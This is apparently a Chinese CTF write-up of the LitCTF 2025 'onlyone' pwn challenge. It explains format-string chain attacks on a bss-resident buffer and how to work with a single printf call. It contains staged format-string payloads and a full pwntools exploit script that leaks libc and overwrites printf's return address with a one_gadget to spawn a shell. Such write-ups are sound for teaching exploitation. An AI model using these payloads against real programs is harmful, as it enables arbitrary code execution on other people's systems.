---
title: "[LitCTF 2025]onlyone Writeup"
date: 2026-10-02T14:20:00+08:00
categories:
  - pwn
tags:
  - pwn
  - 格式化字符串
  - printf 成链攻击
  - one_gadget
  - LitCTF
---

# [LitCTF 2025]onlyone Writeup

## bss段上的fmt

先回顾栈上的fmt，我们常用`%hhn, %hn, %n` 修改地址内容，其作用如下

| 格式符 | 作用                                                         |
| ---- | ------------------------------------------------------------ |
| `%n`   | 把**到目前为止已经输出的字符总数**，当作一个 `int`（通常 4 字节）写入对应参数指向的地址。 |
| `%hn`  | 把总数截断为 `short`（2 字节）写入。                         |
| `%hhn` | 把总数截断为 `char`（1 字节）写入，即 **取总字符数的低 8 位（总字符数 mod 256）**。 |

栈上的fmt和bss段上的fmt区别在于：**输入的字符串的存储位置不同**

- 栈上的fmt泄露（修改）栈上的内容时，能泄露（修改）我们压入栈的内容
- bss段上的fmt同样能泄露（修改）栈上的内容，但由于我们无法将目标地址压入栈中，故无法自由泄露（修改）



## printf成链攻击

为了解决上面的问题，我们引入`printf`成链攻击

>  `printf`成链攻击就是对于`fmt`在堆上或者`bss段`中时，利用栈已有的地址和数据进行任意地址读写的攻击手法。—— 引自 Ex 师傅的《printf 成链攻击》

<!-- more -->

既然栈上已经有一堆地址了，为什么不直接拿 `%n` 往那些地址上写，非要绕一大圈构造多级指针链？

我们先要明白，`%N$n` 的语义是：**取第 N 个参数的值，把这个值当作指针，往它指向的位置写。**

比如栈上的这个数据，我们想修改返回地址为`backdoor`

```
0x7fffffffad58 —▸ 0x401372 (main+47)   ← 返回地址
```

如果写`%5$n`，`printf`会做的是

```
取第 5 个参数的值 = 0x401372
往 0x401372 这个地址写
```

而 `0x401372` 是**代码段**，是 `main+47` 的地址，根本不可写。

这个时候，我们就可以利用类似这样的一个多级链条为跳板，去修改返回地址

```
0x7fffffffad56 —▸ 0x7fffffffad57 —▸ 0x7fffffffad50 ◂— 0x53006e69616d2f2e
```

先修改`0x7fffffffad50`为`0x7fffffffad58`

```
0x7fffffffad56 —▸ 0x7fffffffad57 —▸ 0x7fffffffad58 —▸ 0x401372 (main+47)
```

再修改`0x401372 (main+47)`为`backdoor(0x401332)`。这就达到了我们的目的。



## only_one_printf

以上过程，在有多次`printf`时能够较为容易地做到；那如果题目只给了一次`printf`的机会呢？

假设我们现在要完成上面的过程，payload应该这样构造

```python
payload1 = b'%' + str(stack & 0xff).encode() + b'c%15$hhn'
payload2 = b'%' + str(0x100032 - (stack & 0xff)).encode() + b'c%45$hhn'
```

如果把两个payload合并到一起发送，实际上只能修改第一个地址，不能修改第二个地址。这是因为`printf`在遇到第一个位置参数化的`%15$hhn`时，就已经把整个格式化字符串中所有位置参数一并解析完了，此时`%45$hhn`取到的还是一个与返回地址无关的栈地址；等我们之后再把第 45 个参数改成返回地址，已经来不及了。

### 正确思路

```python
payload = b'%p' * 13 + b'%' + str((stack & 0xff) - len(b'%p' * 13)).encode() + b'c%hhn'   # %15$hhn
payload += b'%' + str(0x100032 - (stack & 0xff)).encode() + b'c%45$hhn'
```

`printf` 解析参数时会根据`%`进行判断，在`%hhn`前面一共有 14 个`%`（13 个`%p`和 1 个`%Nc`），所以`%hhn`是第 15 个转换说明符，`%xxxc%hhn`会将 xxx 数据加上`%p`泄露的字符个数写入第十五个参数。其中`b'%p' * 13`的实际字符数可以通过debug模式的回显得到。



## 例题 [LitCTF 2025]onlyone

首先查看保护

![checksec 结果：Full RELRO、No canary found、NX enabled、PIE enabled](/img/onlyone/image-20261002125430949.png)

注意到`Full RELRO`，这代表got表无法被修改

再到IDA反汇编

```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+7h] [rbp-9h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  puts("Welcome Lictf 2025");
  printf("gift 1 is %p\n", &v3);
  printf("gift 2 is %p\n", &puts);
  read(0, buf, 0x100u);
  printf(buf);
  _exit(0);
}
```

有以下值得我们关注的地方

- 该题是bss段上的格式化字符串，这明显是`printf`成链攻击的信号
- 只有一次`printf`，需要我们用到前文介绍的only_one_printf的技巧
- 题目提供了两个gift：栈的地址和`puts`的真实地址；栈的地址辅助我们构造`printf`成链攻击，`puts`的真实地址可以泄露libc_base
- 程序直接`exit(0)`退出，无法通过修改`main`的返回地址进行ret2攻击

### 攻击思路

首先我们要思考，程序未提供后门时，该如何getshell？

对于该题而言，既然无法通过修改`main`的返回地址进行ret2攻击，我们便尝试修改`printf`的返回地址为某个符合条件的one_gadget。打开gdb调试：

![gdb 中 printf 返回前寄存器与栈的布局](/img/onlyone/image-20261002131833613.png)

![one_gadget 搜索结果，0xe3b01 满足约束](/img/onlyone/image-20261002131939526.png)

整合信息：

- 在ret时，可用的one_gadget的地址为`0xe3b01`
- 如果我们接收到的栈上数据的地址为buff，由相对偏移计算得`printf`跳转时的`rsp`为`buff-15`

由于输入格式化字符串的长度限制，我们无法一次性将`[rsp]`修改为目标one_gadget，那么第一步就是要构造重复执行的`printf`

接下来是另一个问题：一次只能修改两个字节，要改三次，如果直接在`printf`的返回地址上修改，**在修改完成之前`printf`的返回地址都是一个无效地址，`printf`又如何返回到`read`函数前以进行多次修改？**

这是个很值得思考的问题，**既然要实现多次修改，那么`printf`每次的返回地址就只能是固定的`read`函数前的地址（在该题中为`PIE + 0x08BA`）**，我们只能修改栈上其他的数据为one_gadget，**最后跳转到该处执行**。

要做到这点，我们可以修改`[rsp - 0x10]`为one_gadget，在最后一步修改`printf`的返回地址为ret_gadget。

总结完整步骤如下：

- `printf`成链攻击的构造，修改`printf`返回地址为PIE + 0x08BA
- 多次操作修改`[rsp - 0x10]`为one_gadget
- 修改`printf`的返回地址为ret_gadget，最后getshell

### Stage1:实现多次fmt

only_one_printf中已经详细介绍过实现方法，不再赘述

```python
addr = buff - 0xf
payload = b'%p' * 9 + b'%' + str((addr & 0xffff) - 0x5c).encode() + b'c%hn'
payload += b'%' + str(0x1000ba - (addr & 0xffff)).encode() + b'c%39$hhn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)
```

### Stage2:多次操作修改[rsp - 0x10]为one_gadget

```python
#修改返回地址，把rsp放在一条二级链上
rsp = buff - 7
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((rsp - 0xba) & 0xffff).encode() + b'c%27$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，修改rsp后两字节
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((og_r - 0xba) & 0xffff).encode() + b'c%41$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，把rsp中间两字节放在链上
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((rsp - 0xba + 2) & 0xffff).encode() + b'c%27$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，修改rsp中间两字节
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str(((og_r >> 16)- 0xba) & 0xffff).encode() + b'c%41$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，把rsp前两字节放在链上
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((rsp - 0xba + 4) & 0xffff).encode() + b'c%27$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，修改rsp前两字节
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str(((og_r >> 32)- 0xba) & 0xffff).encode() + b'c%41$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，把修改后的rsp（为one_gadget）放在链上
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((rsp - 0xba) & 0xffff).encode() + b'c%27$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)
```

为什么这里每次构造格式化字符串时，没有使用only_one_printf中的技巧？这是因为这里要修改的两处数据并无关联，可以同时修改。

### Stage3:修改printf的返回地址为ret_gadget

```python
#修改返回地址为ret，执行one_gadget
payload = b'%'+str(0x069e).encode()+b'c%39$hn'   #gadget -> ret
payload = payload.ljust(0x100,b'\x00')
p.send(payload)
```

完整攻击脚本如下

```python
from pwn import *
context(log_level='debug', arch='amd64', os='linux')
#p = process('./pwn')
p = remote('node1.anna.nssctf.cn', 20519)
elf = ELF('./pwn')
libc = ELF('./libc-2.31.so')

#gdb.attach(p)
og = 0xe3b01
p.recvuntil(b'gift 1 is ')
buff = int(p.recvuntil(b'\n')[:-1], 16)
p.recvuntil(b'gift 2 is ')
puts = int(p.recvuntil(b'\n')[:-1], 16)
libc_base = puts - libc.sym['puts']
og_r = libc_base + og
log.info(f'buff: {hex(buff)}')

#printf链构造，修改返回地址
addr = buff - 0xf
payload = b'%p' * 9 + b'%' + str((addr & 0xffff) - 0x5c).encode() + b'c%hn'
payload += b'%' + str(0x1000ba - (addr & 0xffff)).encode() + b'c%39$hhn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，把rsp放在一条二级链上
rsp = buff - 7
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((rsp - 0xba) & 0xffff).encode() + b'c%27$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，修改rsp后两字节
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((og_r - 0xba) & 0xffff).encode() + b'c%41$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，把rsp中间两字节放在链上
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((rsp - 0xba + 2) & 0xffff).encode() + b'c%27$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，修改rsp中间两字节
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str(((og_r >> 16)- 0xba) & 0xffff).encode() + b'c%41$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，把rsp前两字节放在链上
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((rsp - 0xba + 4) & 0xffff).encode() + b'c%27$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，修改rsp前两字节
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str(((og_r >> 32)- 0xba) & 0xffff).encode() + b'c%41$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址，把修改后的rsp（为one_gadget）放在链上
payload = b'%' + str(0xba).encode() + b'c%39$hhn'
payload += b'%' + str((rsp - 0xba) & 0xffff).encode() + b'c%27$hn'
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

#修改返回地址为ret，执行one_gadget
payload = b'%'+str(0x069e).encode()+b'c%39$hn'   #gadget -> ret
payload = payload.ljust(0x100,b'\x00')
p.send(payload)

p.interactive() 
```



## 反思与总结

这道题做完之后，笔者对格式化字符串修改任意地址数据的技巧有了更深的理解，只有亲自去调试过，才能知道自己的思路哪里有问题；跟着大手子们的博客去复现每一步，才能理解每一步是如何思考出来的。

感谢ret2z的供题！✋😭🤚



> 参考资料
>
> - [非栈上格式化字符串利用Part1 | mick0960's blog](https://www.mmmick.cn/2025/05/24/非栈上格式化字符串Part1/)
> - [格式化字符串的极限-先知社区](https://xz.aliyun.com/news/17965)
> - [printf 成链攻击 - Ex's blog](https://blog.eonew.cn/2019/08/27/printf-成链攻击/)
> - [MoeCTF 2024 - 西电 CTF 终端](https://ctf.xidian.edu.cn/training/10?challenge=98&tab=answer)
